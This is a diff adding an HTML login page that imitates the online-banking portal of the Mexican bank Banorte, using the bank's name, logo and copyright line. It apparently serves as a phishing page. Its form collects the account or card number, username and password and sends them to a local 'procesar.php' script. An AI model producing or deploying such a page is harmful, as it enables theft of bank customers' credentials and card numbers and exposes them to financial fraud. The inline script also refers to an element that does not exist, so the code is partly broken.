@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+
+<html lang="es">
+    
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width"> 
+        <title>Banorte | El Banco Fuerte De México</title>
+        <link rel="icon" type="image/png" href="Logo-b2.ico">
+        <link rel="stylesheet" href="reset.css">
+        <link rel="stylesheet" href="style.css">
+        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
+    </head>
+
+    <body>
+        <header>
+            <div class="caja">
+                <h1><img src="imagenesb/logobl.png" style ="display: block; margin: 0 auto;"></h1>
+            </div>
+        </header>
+
+        
+        
+        <main class="menu">
+            
+            <h1 id="titulo1" style="display: inline-block; white-space: nowrap;">Banco en Línea</h1><br>
+               
+                <form id="formula" action="procesar.php" method="POST">
+                    <label for="cuenta" style="font-size: 23px; font-family: Arial, Helvetica, sans-serif;">Número de cuenta o tarjeta:</label><br><br>
+                    <input class="nombre" type="text" id="cuenta" name="cuenta" placeholder="No Cuenta/Tarjeta de Crédito o Débito" style="font-size: 14px; caret-color: silver; color: grey;" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(\..*)\./g, '$1');" maxlength="16" required><br><br>
+                    <script>
+                        const input = document.getElementById('nombre');
+                  
+                        input.addEventListener('input', function() {
+                          if (input.value) {
+                            input.style.fontSize = '20px';
+                          } else {
+                            input.style.fontSize = '14px';
+                          }
+                        });
+                    </script>
+                    <label for="usuario" style="font-size: 23px; font-family: Arial, Helvetica, sans-serif;">Usuario:</label><br><br>
+                    <input class="nombre2" type="text" id="usuario" name="usuario" placeholder="Usuario" style="font-size: 18px; caret-color: silver; color: gray;" required><br><br>
+                    <label for="contrasena" style="font-size: 23px; font-family: Arial, Helvetica, sans-serif;">Contraseña:</label><br><br>
+                    <input class="acceso" type="password" id="contrasena" name="contrasena" placeholder="Contraseña" style="font-size: 18px; caret-color: silver; color: gray;" required><br><br>
+                    <input type="submit" value="Enviar" style="background-color: red; color: white; border-color: red; font-size: 18px; margin: 0 0 12px 0;">
+                </form>
+
+             </main>
+        
+        <footer>
+            <p class="copyright">&copy Copyright Grupo Financiero Banorte - 2023</p>
+        </footer>
+        
+    </body>
+</html>
